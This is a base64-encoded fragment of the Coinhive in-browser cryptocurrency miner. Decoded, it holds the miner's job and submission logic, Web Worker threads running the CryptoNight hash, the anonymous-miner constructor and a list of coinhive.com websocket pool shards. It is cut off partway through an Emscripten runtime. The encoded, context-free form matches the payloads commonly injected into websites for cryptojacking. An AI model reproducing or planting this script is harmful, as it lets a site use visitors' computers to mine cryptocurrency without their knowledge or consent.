iAgICAgICAgY29uc29sZS5lcnJvcigiQ29pbmhpdmUgRXJyb3I6IiwgbXNnLnBhcmFtcy5lcnJvcik7CiAgICAgIH0KICAgICAgdGhpcy5fZW1pdCgiZXJyb3IiLCBtc2cucGFyYW1zKTsKICAgICAgaWYgKG1zZy5wYXJhbXMuZXJyb3IgPT09ICJpbnZhbGlkX3NpdGVfa2V5IikgewogICAgICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gNmUzOwogICAgICB9IGVsc2UgaWYgKG1zZy5wYXJhbXMuZXJyb3IgPT09ICJpbnZhbGlkX29wdF9pbiIpIHsKICAgICAgICBpZiAodGhpcy5fc3RvcE9uSW52YWxpZE9wdEluKSB7CiAgICAgICAgICByZXR1cm4gdGhpcy5zdG9wKCk7CiAgICAgICAgfSBlbHNlIGlmICh0aGlzLl9hdXRoKSB7CiAgICAgICAgICB0aGlzLl9hdXRoLnJlc2V0KCk7CiAgICAgICAgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKG1zZy50eXBlID09PSAiYmFubmVkIiB8fCBtc2cucGFyYW1zLmJhbm5lZCkgewogICAgICB0aGlzLl9lbWl0KCJlcnJvciIsIHsgYmFubmVkOiB0cnVlIH0pOwogICAgICB0aGlzLl9yZWNvbm5lY3RSZXRyeSA9IDYwMDsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5fc2V0Sm9iID0gZnVuY3Rpb24oam9iKSB7CiAgICB0aGlzLl9jdXJyZW50Sm9iID0gam9iOwogICAgdGhpcy5fY3VycmVudEpvYi50aHJvdHRsZSA9IHRoaXMuX3Rocm90dGxlOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLl90aHJlYWRzLmxlbmd0aDsgaSsrKSB7CiAgICAgIHRoaXMuX3RocmVhZHNbaV0uc2V0Sm9iKGpvYiwgdGhpcy5fb25UYXJnZXRNZXRCb3VuZCk7CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX29uVGFyZ2V0TWV0ID0gZnVuY3Rpb24ocmVzdWx0KSB7CiAgICB0aGlzLl9lbWl0KCJmb3VuZCIsIHJlc3VsdCk7CiAgICBpZiAocmVzdWx0LmpvYl9pZCA9PT0gdGhpcy5fY3VycmVudEpvYi5qb2JfaWQpIHsKICAgICAgdGhpcy5fc2VuZCgic3VibWl0IiwgewogICAgICAgIGpvYl9pZDogcmVzdWx0LmpvYl9pZCwKICAgICAgICBub25jZTogcmVzdWx0Lm5vbmNlLAogICAgICAgIHJlc3VsdDogcmVzdWx0LnJlc3VsdAogICAgICB9KTsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5fb25WZXJpZmllZCA9IGZ1bmN0aW9uKHZlcmlmeVJlc3VsdCkgewogICAgdGhpcy5fc2VuZCgidmVyaWZpZWQiLCB2ZXJpZnlSZXN1bHQpOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9zZW5kID0gZnVuY3Rpb24odHlwZSwgcGFyYW1zKSB7CiAgICBpZiAoIXRoaXMuX3NvY2tldCkgewogICAgICByZXR1cm47CiAgICB9CiAgICB2YXIgbXNnID0geyB0eXBlOiB0eXBlLCBwYXJhbXM6IHBhcmFtcyB8fCB7fSB9OwogICAgdGhpcy5fc29ja2V0LnNlbmQoSlNPTi5zdHJpbmdpZnkobXNnKSk7CiAgfTsKICB3aW5kb3cuQ29pbkhpdmUgPSB3aW5kb3cuQ29pbkhpdmUgfHwge307CiAgd2luZG93LkNvaW5IaXZlLklGX0VYQ0xVU0lWRV9UQUIgPSAiaWZFeGNsdXNpdmVUYWIiOwogIHdpbmRvdy5Db2luSGl2ZS5GT1JDRV9FWENMVVNJVkVfVEFCID0gImZvcmNlRXhjbHVzaXZlVGFiIjsKICB3aW5kb3cuQ29pbkhpdmUuRk9SQ0VfTVVMVElfVEFCID0gImZvcmNlTXVsdGlUYWIiOwogIHdpbmRvdy5Db2luSGl2ZS5Ub2tlbiA9IGZ1bmN0aW9uKHNpdGVLZXksIGdvYWwsIHBhcmFtcykgewogICAgdmFyIG1pbmVyID0gbmV3IE1pbmVyKHNpdGVLZXksIHBhcmFtcyk7CiAgICBtaW5lci5fZ29hbCA9IGdvYWwgfHwgMDsKICAgIHJldHVybiBtaW5lcjsKICB9OwogIHdpbmRvdy5Db2luSGl2ZS5Vc2VyID0gZnVuY3Rpb24oc2l0ZUtleSwgdXNlciwgcGFyYW1zKSB7CiAgICB2YXIgbWluZXIgPSBuZXcgTWluZXIoc2l0ZUtleSwgcGFyYW1zKTsKICAgIG1pbmVyLl91c2VyID0gdXNlcjsKICAgIHJldHVybiBtaW5lcjsKICB9OwogIHdpbmRvdy5Db2luSGl2ZS5Bbm9ueW1vdXMgPSBmdW5jdGlvbihzaXRlS2V5LCBwYXJhbXMpIHsKICAgIHZhciBtaW5lciA9IG5ldyBNaW5lcihzaXRlS2V5LCBwYXJhbXMpOwogICAgcmV0dXJuIG1pbmVyOwogIH07Cn0pKHdpbmRvdyk7CihmdW5jdGlvbih3aW5kb3cpIHsKICAidXNlIHN0cmljdCI7CiAgdmFyIEpvYlRocmVhZCA9IGZ1bmN0aW9uKCkgewogICAgdGhpcy53b3JrZXIgPSBuZXcgV29ya2VyKENvaW5IaXZlLkNSWVBUT05JR0hUX1dPUktFUl9CTE9CKTsKICAgIHRoaXMud29ya2VyLm9ubWVzc2FnZSA9IHRoaXMub25SZWFkeS5iaW5kKHRoaXMpOwogICAgdGhpcy5jdXJyZW50Sm9iID0gbnVsbDsKICAgIHRoaXMuam9iQ2FsbGJhY2sgPSBmdW5jdGlvbigpIHt9OwogICAgdGhpcy52ZXJpZnlDYWxsYmFjayA9IGZ1bmN0aW9uKCkge307CiAgICB0aGlzLl9pc1JlYWR5ID0gZmFsc2U7CiAgICB0aGlzLmhhc2hlc1BlclNlY29uZCA9IDA7CiAgICB0aGlzLmhhc2hlc1RvdGFsID0gMDsKICAgIHRoaXMucnVubmluZyA9IGZhbHNlOwogICAgdGhpcy5sYXN0TWVzc2FnZVRpbWVzdGFtcCA9IERhdGUubm93KCk7CiAgfTsKICBKb2JUaHJlYWQucHJvdG90eXBlLm9uUmVhZHkgPSBmdW5jdGlvbihtc2cpIHsKICAgIGlmIChtc2cuZGF0YSAhPT0gInJlYWR5IiB8fCB0aGlzLl9pc1JlYWR5KSB7CiAgICAgIHRocm93ICdFeHBlY3RpbmcgZmlyc3QgbWVzc2FnZSB0byBiZSAicmVhZHkiLCBnb3QgJyArIG1zZzsKICAgIH0KICAgIHRoaXMuX2lzUmVhZHkgPSB0cnVlOwogICAgdGhpcy53b3JrZXIub25tZXNzYWdlID0gdGhpcy5vblJlY2VpdmVNc2cuYmluZCh0aGlzKTsKICAgIGlmICh0aGlzLmN1cnJlbnRKb2IpIHsKICAgICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsKICAgICAgdGhpcy53b3JrZXIucG9zdE1lc3NhZ2UodGhpcy5jdXJyZW50Sm9iKTsKICAgIH0KICB9OwogIEpvYlRocmVhZC5wcm90b3R5cGUub25SZWNlaXZlTXNnID0gZnVuY3Rpb24obXNnKSB7CiAgICBpZiAobXNnLmRhdGEudmVyaWZ5X2lkKSB7CiAgICAgIHRoaXMudmVyaWZ5Q2FsbGJhY2sobXNnLmRhdGEpOwogICAgICByZXR1cm47CiAgICB9CiAgICBpZiAobXNnLmRhdGEucmVzdWx0KSB7CiAgICAgIHRoaXMuam9iQ2FsbGJhY2sobXNnLmRhdGEpOwogICAgfQogICAgdGhpcy5oYXNoZXNQZXJTZWNvbmQgPQogICAgICB0aGlzLmhhc2hlc1BlclNlY29uZCAqIDAuNSArIG1zZy5kYXRhLmhhc2hlc1BlclNlY29uZCAqIDAuNTsKICAgIHRoaXMuaGFzaGVzVG90YWwgKz0gbXNnLmRhdGEuaGFzaGVzOwogICAgdGhpcy5sYXN0TWVzc2FnZVRpbWVzdGFtcCA9IERhdGUubm93KCk7CiAgICBpZiAodGhpcy5ydW5uaW5nKSB7CiAgICAgIHRoaXMud29ya2VyLnBvc3RNZXNzYWdlKHRoaXMuY3VycmVudEpvYik7CiAgICB9CiAgfTsKICBKb2JUaHJlYWQucHJvdG90eXBlLnNldEpvYiA9IGZ1bmN0aW9uKGpvYiwgY2FsbGJhY2spIHsKICAgIHRoaXMuY3VycmVudEpvYiA9IGpvYjsKICAgIHRoaXMuam9iQ2FsbGJhY2sgPSBjYWxsYmFjazsKICAgIGlmICh0aGlzLl9pc1JlYWR5ICYmICF0aGlzLnJ1bm5pbmcpIHsKICAgICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsKICAgICAgdGhpcy53b3JrZXIucG9zdE1lc3NhZ2UodGhpcy5jdXJyZW50Sm9iKTsKICAgIH0KICB9OwogIEpvYlRocmVhZC5wcm90b3R5cGUudmVyaWZ5ID0gZnVuY3Rpb24oam9iLCBjYWxsYmFjaykgewogICAgaWYgKCF0aGlzLl9pc1JlYWR5KSB7CiAgICAgIHJldHVybjsKICAgIH0KICAgIHRoaXMudmVyaWZ5Q2FsbGJhY2sgPSBjYWxsYmFjazsKICAgIHRoaXMud29ya2VyLnBvc3RNZXNzYWdlKGpvYik7CiAgfTsKICBKb2JUaHJlYWQucHJvdG90eXBlLnN0b3AgPSBmdW5jdGlvbigpIHsKICAgIGlmICh0aGlzLndvcmtlcikgewogICAgICB0aGlzLndvcmtlci50ZXJtaW5hdGUoKTsKICAgICAgdGhpcy53b3JrZXIgPSBudWxsOwogICAgfQogICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7CiAgfTsKICB3aW5kb3cuQ29pbkhpdmUuSm9iVGhyZWFkID0gSm9iVGhyZWFkOwp9KSh3aW5kb3cpOwpzZWxmLkNvaW5IaXZlID0gc2VsZi5Db2luSGl2ZSB8fCB7fTsKc2VsZi5Db2luSGl2ZS5DT05GSUcgPSB7CiAgTElCX1VSTDogdXJsLAogIEFTTUpTX05BTUU6ICJhLmpzIiwKICBSRVFVSVJFU19BVVRIOiBmYWxzZSwKICBXRUJTT0NLRVRfU0hBUkRTOiBbCiAgICBbCiAgICAgICJ3c3M6Ly93czAwMS5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMDIuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDAzLmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAwNC5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMDUuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDA2LmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAwNy5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMjkuY29pbmhpdmUuY29tL3Byb3h5IgogICAgXSwKICAgIFsKICAgICAgIndzczovL3dzMDA4LmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAwOS5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMTAuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDExLmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAxMi5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMTMuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDE0LmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAzMC5jb2luaGl2ZS5jb20vcHJveHkiCiAgICBdLAogICAgWwogICAgICAid3NzOi8vd3MwMTUuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDE2LmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAxNy5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMTguY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDE5LmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAyMC5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMjEuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDMxLmNvaW5oaXZlLmNvbS9wcm94eSIKICAgIF0sCiAgICBbCiAgICAgICJ3c3M6Ly93czAyMi5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMjMuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDI0LmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAyNS5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMjYuY29pbmhpdmUuY29tL3Byb3h5IiwKICAgICAgIndzczovL3dzMDI3LmNvaW5oaXZlLmNvbS9wcm94eSIsCiAgICAgICJ3c3M6Ly93czAyOC5jb2luaGl2ZS5jb20vcHJveHkiLAogICAgICAid3NzOi8vd3MwMzIuY29pbmhpdmUuY29tL3Byb3h5IgogICAgXQogIF0sCiAgQ0FQVENIQV9VUkw6ICJodHRwczovL2NvaW5oaXZlLmNvbS9jYXB0Y2hhLyIsCiAgTUlORVJfVVJMOiAiaHR0cHM6Ly9jb2luaGl2ZS5jb20vbWVkaWEvbWluZXIuaHRtbCIsCiAgQVVUSF9VUkw6ICJodHRwczovL2F1dGhlZG1pbmUuY29tL2F1dGhlbnRpY2F0ZS5odG1sIgp9OwpDb2luSGl2ZS5DUllQVE9OSUdIVF9XT1JLRVJfQkxPQiA9IFVSTC5jcmVhdGVPYmplY3RVUkwoCiAgbmV3IEJsb2IoWwogICAgJyBzZWxmLkNvaW5IaXZlPXNlbGYuQ29pbkhpdmV8fHt9O3NlbGYuQ29pbkhpdmUuQ09ORklHPXtMSUJfVVJMOiInICsgdXJsICsgJyIsQVNNSlNfTkFNRToiYS5qcyIsUkVRVUlSRVNfQVVUSDpmYWxzZSxXRUJTT0NLRVRfU0hBUkRTOltbIndzczovL3dzMDAxLmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDAyLmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDAzLmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDA0LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDA1LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDA2LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDA3LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDI5LmNvaW5oaXZlLmNvbS9wcm94eSJdLFsid3NzOi8vd3MwMDguY29pbmhpdmUuY29tL3Byb3h5Iiwid3NzOi8vd3MwMDkuY29pbmhpdmUuY29tL3Byb3h5Iiwid3NzOi8vd3MwMTAuY29pbmhpdmUuY29tL3Byb3h5Iiwid3NzOi8vd3MwMTEuY29pbmhpdmUuY29tL3Byb3h5Iiwid3NzOi8vd3MwMTIuY29pbmhpdmUuY29tL3Byb3h5Iiwid3NzOi8vd3MwMTMuY29pbmhpdmUuY29tL3Byb3h5Iiwid3NzOi8vd3MwMTQuY29pbmhpdmUuY29tL3Byb3h5Iiwid3NzOi8vd3MwMzAuY29pbmhpdmUuY29tL3Byb3h5Il0sWyJ3c3M6Ly93czAxNS5jb2luaGl2ZS5jb20vcHJveHkiLCJ3c3M6Ly93czAxNi5jb2luaGl2ZS5jb20vcHJveHkiLCJ3c3M6Ly93czAxNy5jb2luaGl2ZS5jb20vcHJveHkiLCJ3c3M6Ly93czAxOC5jb2luaGl2ZS5jb20vcHJveHkiLCJ3c3M6Ly93czAxOS5jb2luaGl2ZS5jb20vcHJveHkiLCJ3c3M6Ly93czAyMC5jb2luaGl2ZS5jb20vcHJveHkiLCJ3c3M6Ly93czAyMS5jb2luaGl2ZS5jb20vcHJveHkiLCJ3c3M6Ly93czAzMS5jb2luaGl2ZS5jb20vcHJveHkiXSxbIndzczovL3dzMDIyLmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDIzLmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDI0LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDI1LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDI2LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDI3LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDI4LmNvaW5oaXZlLmNvbS9wcm94eSIsIndzczovL3dzMDMyLmNvaW5oaXZlLmNvbS9wcm94eSJdXSxDQVBUQ0hBX1VSTDoiaHR0cHM6Ly9jb2luaGl2ZS5jb20vY2FwdGNoYS8iLE1JTkVSX1VSTDoiaHR0cHM6Ly9jb2luaGl2ZS5jb20vbWVkaWEvbWluZXIuaHRtbCIsQVVUSF9VUkw6Imh0dHBzOi8vYXV0aGVkbWluZS5jb20vYXV0aGVudGljYXRlLmh0bWwifTt2YXIgTW9kdWxlPXtsb2NhdGVGaWxlOihmdW5jdGlvbihwYXRoKXtyZXR1cm4gQ29pbkhpdmUuQ09ORklHLkxJQl9VUkwrcGF0aH0pfTt2YXIgTW9kdWxlO2lmKCFNb2R1bGUpTW9kdWxlPSh0eXBlb2YgTW9kdWxlIT09InVuZGVmaW5lZCI/TW9kdWxlOm51bGwpfHx7fTt2YXIgbW9kdWxlT3ZlcnJpZGVzPXt9O2Zvcih2YXIga2V5IGluIE1vZHVsZSl7aWYoTW9kdWxlLmhhc093blByb3BlcnR5KGtleSkpe21vZHVsZU92ZXJyaWRlc1trZXldPU1vZHVsZVtrZXldfX12YXIgRU5WSVJPTk1FTlRfSVNfV0VCPWZhbHNlO3ZhciBFTlZJUk9OTUVOVF9JU19XT1JLRVI9ZmFsc2U7dmFyIEVOVklST05NRU5UX0lTX05PREU9ZmFsc2U7dmFyIEVOVklST05NRU5UX0lTX1NIRUxMPWZhbHNlO2lmKE1vZHVsZVsiRU5WSVJPTk1FTlQiXSl7aWYoTW9kdWxlWyJFTlZJUk9OTUVOVCJdPT09IldFQiIpe0VOVklST05NRU5UX0lTX1dFQj10cnVlfWVsc2UgaWYoTW9kdWxlWyJFTlZJUk9OTUVOVCJdPT09IldPUktFUiIpe0VOVklST05NRU5UX0lTX1dPUktFUj10cnVlfWVsc2UgaWYoTW9kdWxlWyJFTlZJUk9OTUVOVCJdPT09Ik5PREUiKXtFTlZJUk9OTUVOVF9JU19OT0RFPXRydWV9ZWxzZSBpZihNb2R1bGVbIkVOVklST05NRU5UIl09PT0iU0hFTEwiKXtFTlZJUk9OTUVOVF9JU19TSEVMTD10cnVlfWVsc2V7dGhyb3cgbmV3IEVycm9yKCJUaGUgcHJvdmlkZWQgTW9kdWxlW1wnRU5WSVJPTk1FTlRcJ10gdmFsdWUgaXMgbm90IHZhbGlkLiBJdCBtdXN0IGJlIG9uZSBvZjogV0VCfFdPUktFUnxOT0RFfFNIRUxMLiIpfX1lbHNle0VOVklST05NRU5UX0lTX1dFQj10eXBlb2Ygd2luZG93PT09Im9iamVjdCI7RU5WSVJPTk1FTlRfSVNfV09SS0VSPXR5cGVvZiBpbXBvcnRTY3JpcHRzPT09ImZ1bmN0aW9uIjtFTlZJUk9OTUVOVF9JU19OT0RFPXR5cGVvZiBwcm9jZXNzPT09Im9iamVjdCImJnR5cGVvZiByZXF1aXJlPT09ImZ1bmN0aW9uIiYmIUVOVklST05NRU5UX0lTX1dFQiYmIUVOVklST05NRU5UX0lTX1dPUktFUjtFTlZJUk9OTUVOVF9JU19TSEVMTD0hRU5WSVJPTk1FTlRfSVNfV0VCJiYhRU5WSVJPTk1FTlRfSVNfTk9ERSYmIUVOVklST05NRU5UX0lTX1dPUktFUn1pZihFTlZJUk9OTUVOVF9JU19OT0RFKXtpZighTW9kdWxlWyJwcmludCJdKU1vZHVsZVsicHJpbnQiXT1jb25zb2xlLmxvZztpZighTW9kdWxlWyJwcmludEVyciJdKU1vZHVsZVsicHJpbnRFcnIiXT1jb25zb2xlLndhcm47dmFyIG5vZGVGUzt2YXIgbm9kZVBhdGg7TW9kdWxlWyJyZWFkIl09ZnVuY3Rpb24gc2hlbGxfcmVhZChmaWxlbmFtZSxiaW5hcnkpe2lmKCFub2RlRlMpbm9kZUZTPXJlcXVpcmUoImZzIik7aWYoIW5vZGVQYXRoKW5vZGVQYXRoPXJlcXVpcmUoInBhdGgiKTtmaWxlbmFtZT1ub2RlUGF0aFsibm9ybWFsaXplIl0oZmlsZW5hbWUpO3ZhciByZXQ9bm9kZUZTWyJyZWFkRmlsZVN5bmMiXShmaWxlbmFtZSk7cmV0dXJuIGJpbmFyeT9yZXQ6cmV0LnRvU3RyaW5nKCl9O01vZHVsZVsicmVhZEJpbmFyeSJdPWZ1bmN0aW9uIHJlYWRCaW5hcnkoZmlsZW5hbWUpe3ZhciByZXQ9TW9kdWxlWyJyZWFkIl0oZmlsZW5hbWUsdHJ1ZSk7aWYoIXJldC5idWZmZXIpe3JldD1uZXcgVWludDhBcnJheShyZXQpfWFzc2VydChyZXQuYnVmZmVyKTtyZXR1cm4gcmV0fTtNb2R1bGVbImxvYWQiXT1mdW5jdGlvbiBsb2FkKGYpe2dsb2JhbEV2YWwocmVhZChmKSl9O2lmKCFNb2R1bGVbInRoaXNQcm9ncmFtIl0pe2lmKHByb2Nlc3NbImFyZ3YiXS5sZW5ndGg+MSl7TW9kdWxlWyJ0aGlzUHJvZ3JhbSJdPXByb2Nlc3NbImFyZ3YiXVsxXS5yZXBsYWNlKC9cXFxcL2csIi8iKX1lbHNle01vZHVsZVsidGhpc1Byb2dyYW0iXT0idW5rbm93bi1wcm9ncmFtIn19TW9kdWxlWyJhcmd1bWVudHMiXT1wcm9jZXNzWyJhcmd2Il0uc2xpY2UoMik7aWYodHlwZW9mIG1vZHVsZSE9PSJ1bmRlZmluZWQiKXttb2R1bGVbImV4cG9ydHMiXT1Nb2R1bGV9cHJvY2Vzc1sib24iXSgidW5jYXVnaHRFeGNlcHRpb24iLChmdW5jdGlvbihleCl7aWYoIShleCBpbnN0YW5jZW9mIEV4aXRTdGF0dXMpKXt0aHJvdyBleH19KSk7TW9kdWxlWyJpbnNwZWN0Il09KGZ1bmN0aW9uKCl7cmV0dXJuIltFbXNjcmlwdGVuIE1vZHVsZSBvYmplY3RdIn0pfWVsc2UgaWYoRU5WSVJPTk1FTlRfSVNfU0hFTEwpe2lmKCFNb2R1bGVbInByaW50Il0pTW9kdWxlWyJwcmludCJdPXByaW50O2lmKHR5cGVvZiBwcmludEVyciE9InVuZGVmaW5lZCIpTW9kdWxlWyJwcmludEVyciJdPXByaW50RXJyO2lmKHR5cGVvZiByZWFkIT0idW5kZWZpbmVkIil7TW9kdWxlWyJyZWFkIl09cmVhZH1lbHNle01vZHVsZVsicmVhZCJdPWZ1bmN0aW9uIHNoZWxsX3JlYWQoKXt0aHJvdyJubyByZWFkKCkgYXZhaWxhYmxlIn19TW9kdWxlWyJyZWFkQmluYXJ5Il09ZnVuY3Rpb24gcmVhZEJpbmFyeShmKXtpZih0eXBlb2YgcmVhZGJ1ZmZlcj09PSJmdW5jdGlvbiIpe3JldHVybiBuZXcgVWludDhBcnJheShyZWFkYnVmZmVyKGYpKX12YXIgZGF0YT1yZWFkKGYsImJpbmFyeSIpO2Fzc2VydCh0eXBlb2YgZGF0YT09PSJvYmplY3QiKTtyZXR1cm4gZGF0YX07aWYodHlwZW9mIHNjcmlwdEFyZ3MhPSJ1bmRlZmluZWQiKXtNb2R1bGVbImFyZ3VtZW50cyJdPXNjcmlwdEFyZ3N9ZWxzZSBpZih0eXBlb2YgYXJndW1lbnRzIT0idW5kZWZpbmVkIil7TW9kdWxlWyJhcmd1bWVudHMiXT1hcmd1bWVudHN9aWYodHlwZW9mIHF1aXQ9PT0iZnVuY3Rpb24iKXtNb2R1bGVbInF1aXQiXT0oZnVuY3Rpb24oc3RhdHVzLHRvVGhyb3cpe3F1aXQoc3RhdHVzKX0pfX1lbHNlIGlmKEVOVklST05NRU5UX0lTX1dFQnx8RU5WSVJPTk1FTlRfSVNfV09SS0VSKXtNb2R1bGVbInJlYWQiXT1mdW5jdGlvbiBzaGVsbF9yZWFkKHVybCl7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3Q7eGhyLm9wZW4oIkdFVCIsdXJsLGZhbHNlKTt4aHIuc2VuZChudWxsKTtyZXR1cm4geGhyLnJlc3BvbnNlVGV4dH07aWYoRU5WSVJPTk1FTlRfSVNfV09SS0VSKXtNb2R1bGVbInJlYWRCaW5hcnkiXT1mdW5jdGlvbiByZWFkQmluYXJ5KHVybCl7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3Q7eGhyLm9wZW4oIkdFVCIsdXJsLGZhbHNlKTt4aHIucmVzcG9uc2VUeXBlPSJhcnJheWJ1ZmZlciI7eGhyLnNlbmQobnVsbCk7cmV0dXJuIG5ldyBVaW50OEFycmF5KHhoci5yZXNwb25zZSl9fU1vZHVsZVsicmVhZEFzeW5jIl09ZnVuY3Rpb24gcmVhZEFzeW5jKHVybCxvbmxvYWQsb25lcnJvcil7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3Q7eGhyLm9wZW4oIkdFVCIsdXJsLHRydWUpO3hoci5yZXNwb25zZVR5cGU9ImFycmF5YnVmZmVyIjt4aHIub25sb2FkPWZ1bmN0aW9uIHhocl9vbmxvYWQoKXtpZih4aHIuc3RhdHVzPT0yMDB8fHhoci5zdGF0dXM9PTAmJnhoci5yZXNwb25zZSl7b25sb2FkKHhoci5yZXNwb25zZSl9ZWxzZXtvbmVycm9yKCl9fTt4aHIub25lcnJvcj1vbmVycm9yO3hoci5zZW5kKG51bGwpfTtpZih0eXBlb2YgYXJndW1lbnRzIT0idW5kZWZpbmVkIil7TW9kdWxlWyJhcmd1bWVudHMiXT1hcmd1bWVudHN9aWYodHlwZW9mIGNvbnNvbGUhPT0idW5kZWZpbmVkIil7aWYoIU1vZHVsZVsicHJpbnQiXSlNb2R1bGVbInByaW50Il09ZnVuY3Rpb24gc2hlbGxfcHJpbnQoeCl7Y29uc29sZS5sb2coeCl9O2lmKCFNb2R1bGVbInByaW50RXJyIl0pTW9kdWxlWyJwcmludEVyciJdPWZ1bmN0aW9uIHNoZWxsX3ByaW50RXJyKHgpe2NvbnNvbGUud2Fybih4KX19ZWxzZXt2YXIgVFJZX1VTRV9EVU1QPWZhbHNlO2lmKCFNb2R1bGVbInByaW50Il0pTW9kdWxlWyJwcmludCJdPVRSWV9VU0VfRFVNUCYmdHlwZW9mIGR1bXAhPT0idW5kZWZpbmVkIj8oZnVuY3Rpb24oeCl7ZHVtcCh4KX0pOihmdW5jdGlvbih4KXt9KX1pZihFTlZJUk9OTUVOVF9JU19XT1JLRVIpe01vZHVsZVsibG9hZCJdPWltcG9ydFNjcmlwdHN9aWYodHlwZW9mIE1vZHVsZVsic2V0V2luZG93VGl0bGUiXT09PSJ1bmRlZmluZWQiKXtNb2R1bGVbInNldFdpbmRvd1RpdGxlIl09KGZ1bmN0aW9uKHRpdGxlKXtkb2N1bWVudC50aXRsZT10aXRsZX0pfX1lbHNle3Rocm93IlVua25vd24gcnVudGltZSBlbnZpcm9ubWVudC4gV2hlcmUgYXJlIHdlPyJ9ZnVuY3Rpb24gZ2xvYmFsRXZhbCh4KXtldmFsLmNhbGwobnVsbCx4KX1pZighTW9kdWxlWyJsb2FkIl0mJk1vZHVsZVsicmVhZCJdKXtNb2R1bGVbImxvYWQiXT1mdW5jdGlvbiBsb2FkKGYpe2dsb2JhbEV2YWwoTW9kdWxlWyJyZWFkIl0oZikpfX1pZighTW9kdWxlWyJwcmludCJdKXtNb2R1bGVbInByaW50Il09KGZ1bmN0aW9uKCl7fSl9aWYoIU1vZHVsZVsicHJpbnRFcnIiXSl7TW9kdWxlWyJwcmludEVyciJdPU1vZHVsZVsicHJpbnQiXX1pZighTW9kdWxlWyJhcmd1bWVudHMiXSl7TW9kdWxlWyJhcmd1bWVudHMiXT1bXX1pZighTW9kdWxlWyJ0aGlzUHJvZ3JhbSJdKXtNb2R1bGVbInRoaXNQcm9ncmFtIl09Ii4vdGhpcy5wcm9ncmFtIn1pZighTW9kdWxlWyJxdWl0Il0pe01vZHVsZVsicXVpdCJdPShmdW5jdGlvbihzdGF0dXMsdG9UaHJvdyl7dGhyb3cgdG9UaHJvd30pfU1vZHVsZS5wcmludD1Nb2R1bGVbInByaW50Il07TW9kdWxlLnByaW50RXJyPU1vZHVsZVsicHJpbnRFcnIiXTtNb2R1bGVbInByZVJ1biJdPVtdO01vZHVsZVsicG9zdFJ1biJdPVtdO2Zvcih2YXIga2V5IGluIG1vZHVsZU92ZXJyaWRlcyl7aWYobW9kdWxlT3ZlcnJpZGVzLmhhc093blByb3BlcnR5KGtleSkpe01vZHVsZVtrZXldPW1vZHVsZU92ZXJyaWRlc1trZXldfX1tb2R1bGVPdmVycmlkZXM9dW5kZWZpbmVkO3ZhciBSdW50aW1lPXtzZXRUZW1wUmV0MDooZnVuY3Rpb24odmFsdWUpe3RlbXBSZXQwPXZhbHVlO3JldHVybiB2YWx1ZX0pLGdldFRlbXBSZXQwOihmdW5jdGlvbigpe3JldHVybiB0ZW1wUmV0MH0pLHN0YWNrU2F2ZTooZnVuY3Rpb24oKXtyZXR1cm4gU1RBQ0tUT1B9KSxzdGFja1Jlc3RvcmU6KGZ1bmN0aW9uKHN0YWNrVG9wKXtTVEFDS1RPUD1zdGFja1RvcH0pLGdldE5hdG